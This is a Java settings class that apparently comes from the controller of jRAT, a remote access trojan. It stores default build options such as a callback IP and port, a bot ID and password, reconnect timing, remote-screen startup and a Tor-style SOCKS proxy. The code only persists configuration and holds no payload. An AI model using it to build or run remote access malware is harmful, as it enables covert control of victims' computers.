package io.jrat.controller.settings;

import com.cedarsoftware.util.io.JsonObject;
import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;
import io.jrat.controller.Globals;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;


public class Settings extends AbstractStorable {

	private static final Settings instance = new Settings();

	private transient JsonObject settings = new JsonObject();

	public static Settings getGlobal() {
		return instance;
	}

	public String getString(String key) {
		Object obj = settings.get(key);
		return obj == null ? "" : (String) obj;
	}

	public Object get(String key) {
		return settings.get(key);
	}

	public int getInt(String key) {
		Object obj = settings.get(key);
		return obj == null ? -1 : (Integer) obj;
	}

	public boolean getBoolean(String key) {
		Object obj = settings.get(key);
		return obj == null ? false : obj.toString().equalsIgnoreCase("true");
	}

	public void setVal(String key, Object value) {
		settings.put(key, value);
	}

	public void load() throws Exception {
		try {
			Map args = new HashMap();
			args.put(JsonReader.USE_MAPS, true);

			settings = (JsonObject) JsonReader.jsonToJava(new FileInputStream(getFile()), args);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		if (settings.size() == 0) {
			addDefault();
		}
	}

	public void save() throws Exception {
		try {
			PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));

			Map args = new HashMap();
			args.put(JsonWriter.TYPE, false);
			pw.print(JsonWriter.formatJson(JsonWriter.objectToJson(settings, args)));

			pw.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void addDefault() {
		setVal("bip", "127.0.0.1");
		setVal("bport", 1336);
		setVal("bid", "Name");
		setVal("bpass", "pass");
		setVal("brecat", 10);
		setVal("traynote", true);
		setVal("stats", true);
		setVal("jarname", "File");
		setVal("remotescreenstartup", false);
		setVal("askurl", true);
		setVal("max", -1);
		setVal("geoip", true);
		setVal("proxy", false);
		setVal("proxyhost", "127.0.0.1");
		setVal("proxyport", 9050);
		setVal("proxysocks", true);
		setVal("plugintransfer", false);
		setVal("rowheight", 30);
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".settings");
	}
}
